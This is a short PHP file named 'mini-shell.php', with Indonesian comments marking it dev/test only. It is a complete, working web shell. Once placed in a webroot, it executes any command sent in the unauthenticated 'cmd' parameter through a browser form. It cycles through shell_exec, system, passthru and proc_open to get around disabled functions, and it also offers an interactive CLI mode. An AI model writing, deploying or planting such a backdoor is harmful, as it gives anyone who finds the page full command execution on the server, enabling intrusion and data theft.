<?php
// mini-shell.php — DEV/TEST ONLY, hapus setelah dipakai!
// Usage: php shell.php  (CLI)  ATAU letakkan di webroot & akses via browser
// Di browser: ?cmd=ls -la  atau pakai form di bawah

error_reporting(E_ALL);
ini_set('display_errors', 1);

function run($cmd) {
    // 3 cara eksekusi, tergantung yang available di server
    if (function_exists('shell_exec')) {
        return shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        return ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd . ' 2>&1');
        return ob_get_clean();
    } elseif (function_exists('proc_open')) {
        $proc = proc_open($cmd, [1 => ['pipe','w'], 2 => ['pipe','w']], $pipes);
        $out = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
        fclose($pipes[1]); fclose($pipes[2]);
        proc_close($proc);
        return $out;
    }
    return "ERROR: semua exec function di-disable (disable_functions)";
}

header('Content-Type: text/plain; charset=utf-8');

if (php_sapi_name() === 'cli') {
    // Mode CLI interaktif
    echo "Mini Shell (CLI mode). ketik 'exit' buat keluar.\n";
    while (true) {
        echo getcwd() . " $ ";
        $line = trim(fgets(STDIN));
        if ($line === 'exit' || feof(STDIN)) break;
        echo run($line) . "\n";
    }
    exit;
}

// Mode web
$cmd = $_GET['cmd'] ?? $_POST['cmd'] ?? null;
?>
<!DOCTYPE html>
<html>
<head><title>Mini Shell</title>
<style>
  body { background:#111; color:#0f0; font-family:monospace; padding:20px; }
  pre  { background:#000; padding:10px; border:1px solid #333; white-space:pre-wrap; }
  input{ background:#000; color:#0f0; border:1px solid #333; padding:8px; width:70%; font-family:monospace; }
  button{ background:#0f0; color:#000; border:0; padding:8px 16px; font-family:monospace; }
</style></head>
<body>
<h3>Mini Shell — <?= php_uname() ?></h3>
<form method="get">
  <input name="cmd" placeholder="ls -la" autofocus>
  <button>Run</button>
</form>
<?php if ($cmd !== null): ?>
<pre><?= htmlspecialchars(run($cmd)) ?></pre>
<?php endif; ?>
</body>
</html>
